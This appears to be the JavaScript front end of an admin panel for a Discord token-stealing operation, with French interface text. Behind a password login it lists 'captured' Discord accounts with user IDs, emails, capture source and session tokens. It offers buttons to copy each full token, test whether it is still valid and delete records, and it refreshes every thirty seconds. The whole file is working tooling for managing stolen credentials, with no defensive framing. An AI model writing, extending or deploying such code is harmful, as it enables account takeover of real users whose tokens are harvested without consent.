(function () {
  "use strict";

  const loginBtn = document.getElementById("login");
  const passwordInput = document.getElementById("password");
  const loginError = document.getElementById("login-error");

  if (loginBtn) {
    async function doLogin() {
      const password = (passwordInput.value || "").trim();
      if (!password) return;
      loginBtn.disabled = true;
      try {
        const response = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ password: password })
        });
        if (!response.ok) {
          loginError.textContent = "Mot de passe incorrect.";
          loginBtn.disabled = false;
          return;
        }
        location.reload();
      } catch (error) {
        loginError.textContent = "Erreur reseau.";
        loginBtn.disabled = false;
      }
    }

    loginBtn.addEventListener("click", doLogin);
    passwordInput.addEventListener("keydown", function (event) {
      if (event.key === "Enter") doLogin();
    });
    passwordInput.focus();
    return;
  }

  const rows = document.getElementById("rows");
  const empty = document.getElementById("empty");
  const search = document.getElementById("search");
  const refresh = document.getElementById("refresh");
  const logout = document.getElementById("logout");

  let debounce = null;

  function escapeHtml(value) {
    return String(value == null ? "" : value).replace(/[&<>"']/g, function (char) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[char];
    });
  }

  function maskToken(token) {
    if (!token) return "";
    if (token.length <= 26) return token;
    return token.slice(0, 16) + "..." + token.slice(-8);
  }

  function formatDate(iso) {
    if (!iso) return "-";
    return new Date(iso).toLocaleString("fr-FR", { dateStyle: "short", timeStyle: "short" });
  }

  function avatarUrl(item) {
    if (item.avatar) {
      return "https://cdn.discordapp.com/avatars/" + item.user_id + "/" + item.avatar + ".png?size=64";
    }
    return "https://cdn.discordapp.com/embed/avatars/0.png";
  }

  async function loadStats() {
    try {
      const response = await fetch("/api/stats");
      if (response.status === 401) { location.reload(); return; }
      const data = await response.json();
      document.querySelectorAll("[data-stat]").forEach(function (element) {
        const key = element.getAttribute("data-stat");
        element.textContent = data[key] == null ? "0" : data[key];
      });
    } catch (error) { /* ignore */ }
  }

  async function loadCaptures() {
    const query = search ? search.value.trim() : "";
    try {
      const response = await fetch("/api/captures?limit=300&search=" + encodeURIComponent(query));
      if (response.status === 401) { location.reload(); return; }
      const data = await response.json();
      render(data.items || []);
    } catch (error) { /* ignore */ }
  }

  function render(items) {
    rows.innerHTML = "";
    empty.hidden = items.length > 0;
    items.forEach(function (item) {
      const tr = document.createElement("tr");
      const name = item.global_name || item.username || item.user_id;

      tr.innerHTML =
        "<td class='nowrap'>" + escapeHtml(formatDate(item.captured_at)) + "</td>" +
        "<td><div class='user'>" +
        "<img class='avatar' src='" + escapeHtml(avatarUrl(item)) + "' alt=''>" +
        "<div><div class='uname'>" + escapeHtml(name) + "</div>" +
        "<div class='uid'>" + escapeHtml(item.user_id) + "</div></div></div></td>" +
        "<td>" + escapeHtml(item.email || "-") + "</td>" +
        "<td><span class='tag'>" + escapeHtml(item.source) + "</span></td>" +
        "<td><code class='tok' title='" + escapeHtml(item.token) + "'>" +
        escapeHtml(maskToken(item.token)) + "</code></td>" +
        "<td>" + (item.valid ? "<span class='ok'>valide</span>" : "<span class='ko'>invalide</span>") + "</td>" +
        "<td class='row-actions'></td>";

      const actions = tr.querySelector(".row-actions");

      const copyBtn = document.createElement("button");
      copyBtn.className = "mini";
      copyBtn.textContent = "Copier";
      copyBtn.addEventListener("click", function () {
        navigator.clipboard.writeText(item.token);
        copyBtn.textContent = "Copie !";
        setTimeout(function () { copyBtn.textContent = "Copier"; }, 1200);
      });

      const checkBtn = document.createElement("button");
      checkBtn.className = "mini";
      checkBtn.textContent = "Tester";
      checkBtn.addEventListener("click", async function () {
        checkBtn.textContent = "...";
        await fetch("/api/captures/" + item.id + "/check", { method: "POST" });
        checkBtn.textContent = "Tester";
        loadCaptures();
      });

      const delBtn = document.createElement("button");
      delBtn.className = "mini danger";
      delBtn.textContent = "Suppr.";
      delBtn.addEventListener("click", async function () {
        await fetch("/api/captures/" + item.id, { method: "DELETE" });
        loadCaptures();
        loadStats();
      });

      actions.appendChild(copyBtn);
      actions.appendChild(checkBtn);
      actions.appendChild(delBtn);
      rows.appendChild(tr);
    });
  }

  if (search) {
    search.addEventListener("input", function () {
      clearTimeout(debounce);
      debounce = setTimeout(loadCaptures, 250);
    });
  }
  if (refresh) refresh.addEventListener("click", function () { loadCaptures(); loadStats(); });
  if (logout) {
    logout.addEventListener("click", async function () {
      await fetch("/api/logout", { method: "POST" });
      location.reload();
    });
  }

  loadStats();
  loadCaptures();
  setInterval(function () { loadStats(); loadCaptures(); }, 30000);
})();
